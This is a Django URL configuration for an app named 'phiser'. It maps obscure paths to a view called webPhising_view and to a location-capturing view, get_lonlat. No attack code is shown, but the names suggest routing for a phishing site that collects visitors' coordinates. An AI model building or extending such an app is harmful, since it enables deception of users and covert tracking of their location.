from django.urls import path

from . import views

app_name = 'phiser'
urlpatterns = [
    path('i3/<slug:cat>/<slug:name>/', views.webPhising_view, name='prod_web'),
    path('xe/lo/', views.get_lonlat, name='get_geo'),
]